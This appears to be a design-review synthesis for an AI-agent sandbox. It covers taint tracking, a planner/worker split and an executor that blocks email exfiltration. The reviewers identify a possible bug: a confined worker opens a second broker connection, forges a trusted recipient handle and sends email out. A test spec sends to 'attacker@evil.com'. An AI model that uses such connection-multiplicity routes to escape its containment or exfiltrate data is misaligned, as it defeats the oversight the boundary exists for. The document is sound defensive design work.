## The headline: the reviewers converge, then diverge on ONE assumption — and the code sides with Fable

Both reviewers independently killed the same three things in my draft:
- **Gate item 4 (context-dump grep) is theater.** Matt: it tests harness input, not enforcement, and misses recipient *fragmentation* (`Reply-To:`+`Domain:` joined later — plaintext grep finds nothing while the planner holds both halves). Fable: it's the exact CLAUDE.md-banned "stapled at the sink proves nothing" class; a fully-broken executor still passes it. **Replace with a deterministic construction-site assertion:** feed the planner-prompt constructor a tainted record with a sentinel literal (sentinel each fragment), assert the sentinel bytes never appear in the constructed prompt.
- **"Mostly wiring" is wrong.** The tainted value flows through the *worker's* `mint_from_read`/`mint_from_derivation`, never the planner. So the v1.3 block fires identically whether the planner is a `for`-loop or a frontier model. Swapping an LLM in proves nothing new about enforcement *by itself*. The only new degrees of freedom an LLM has: (a) which sink [fails closed: `UnknownSink`], (b) **which handle → which slot [= T2, unenforced].**
- **T2 is the real milestone, and it is unenforced.** `executor/lib.rs:119`: block requires `sensitive_slot AND is_untrusted(taint)`. A `UserTrusted` handle in the `to` slot satisfies neither. `executor_decision.rs` DenyReason taxonomy has **no slot-mismatch variant**. Nothing binds a handle's semantic origin to the slot it may fill. Safe today only *incidentally* — every `UserTrusted` handle is human-typed at the CLI, so a misrouted one carries the human's own subject and the SMTP adapter rejects it as malformed. Luck, not enforcement.

**Where they diverge:** T1 (trusted-mint forgery via `ProvideIntent`).
- **Matt:** unreachable. The planner has no broker UDS connection; only the worker does; guard (a) seals `ProvideIntent` to once-before-any-RequestFd. "Seal it human-only" = describing the status quo.
- **Fable:** reachable via **connection multiplicity**. "Planner outside the worker" = a second participant = a second connection. Guard (a) and `session_status` are BOTH per-connection state; a second connection gets a pristine guard (a) and a stale-`Active` status. → mint attacker literal `UserTrusted` → route to `to` → Allowed → send.

## This may be a LIVE v1.3 bug, not a v1.4 design question

If a **confined worker** (not just a future planner) can open a second AF_UNIX connection after reading the doc, the exfiltration path exists in shipped-2026-07-09 code. All six preconditions are code-confirmed. What is NOT confirmed: an actual live Linux repro. Per project rule ("independently re-run the live proof"; "substrate working ≠ done"), a claimed exfil path is proven by a live test, never a code read.

**Falsification test (write this FIRST, before any v1.4 planning):**
> A confined worker, post-`mint_from_read` (session demoted to Draft in DB), opens a SECOND connection to `\0/agentos/{session_id}`, sends `ProvideIntent{SendEmailSummary{recipient:"attacker@evil.com",...}}`, then `SubmitPlanNode` routing that handle to `to`. **Assert the desired outcome is Block/Deny + Mailpit==0.** If it Allows and sends → live v1.3 exfiltration, blast radius auth/exfil, fix precedes all v1.4 scope.

Run via `scripts/mailpit-verify.sh` with `MAILPIT_VERIFY_CMD` scoped to the new test.

**If it reproduces:** the fix is broker-side coherent session-trust state (all connections for a session share one `session_status` resolved from the DB/authoritative store, not per-connection clones) + a per-verb capability split (a planner/second connection may hold NO mint verb). That is exactly Fable's "shared-but-restricted value channel + per-verb capability split + cross-connection trust coherence" — real TCB design work with its own gate.

## Other findings worth carrying into the DESIGN gate

- **MAJOR-2 (Fable): replay honesty.** Allowed-path has no CAS; under an *adaptive* planner the replay actor collapses from "external" to "the milestone's own adversary." Amplification is bounded to trusted/human-typed recipients (untrusted still Blocks) → DoS/duplication, not new exfil. But "accepted, not reopened" must be RE-EARNED against the new actor in writing, or it violates DOC-01. Either re-justify or scope a minimal CAS.
- **MAJOR-3 (Fable): the reduction must audit all THREE mint sites,** not just `ProvideIntent`. `mint_from_read` is safe only via the *sensitivity map* (stamps `ExternalUntrusted`→Blocks); `mint_from_derivation` safe by byte-verify+all-`file_read` guard. Correct claim: "the only mint yielding a TRUSTED handle from a supplied string is `ProvideIntent`." Reopens the instant any sink's sensitivity map treats `WorkerExtracted`/`ExternalUntrusted` as non-blocking on some arg.
- **MEDIUM-1 (Fable): the decision is an oracle.** `Allowed` vs `BlockedPendingConfirmation{anchors}` leaks per-handle taint state, and `literal_sha256` per blocked arg (`executor_decision.rs:144`) gives an offline literal-guess confirmer. Higher-bandwidth than my T3 "handle A vs B" hand-wave; treat explicitly.
- **NIT (Fable): there is no `Planner` trait.** It's a bare fn `plan_from_intent` (`planner.rs:76`). The seam must be *designed*, not dropped-into — which is where the BLOCKER lives.

## The honest shape of v1.4 (post-review)

**NOT** "put an LLM in the seat and re-run v1.3." That proves nothing new. The milestone is:

**Design and prove the worker/planner trust boundary** — a shared-but-restricted value channel, a per-verb capability split (planner holds no mint verb), and coherent cross-connection session-trust state — such that an adversarial planner is **Blocked by the TCB** with genuine propagation (the v1.3 items 2-3 gate, NOT the grep), with:
- T1 closed by *construction and proof* (the connection-multiplicity hole above, fixed and live-tested), tripwire named: "wire planner output into any mint and T1 reopens."
- T2 either enforced (slot–type binding in the executor — new DenyReason, new TCB logic) or documented as the accepted v1.4 residual with slot–type binding deferred to v1.5. **Pick one in the DESIGN gate.**
- Replay re-earned or CAS'd (MAJOR-2). Three-mint-site audit (MAJOR-3). Oracle documented (MEDIUM-1).

This is design work with its own review gate — which is itself the proof it was never "wiring." PROJECT.md:472 deferred laundering under a *deterministic in-process planner* assumption; the reframe correctly retires the token-stream framing, but the residual it exposes (trusted-mint reachability under a multi-party architecture) is real and is the milestone.

**Size:** Matt's "~10-15 plans if T2 is a documented residual" and Fable's "this is research-adjacent design, not wiring" are compatible: it's one milestone IF T2 is deferred to v1.5 and the boundary design is the spine. If T2 enforcement (slot–type binding) comes in, it's two.
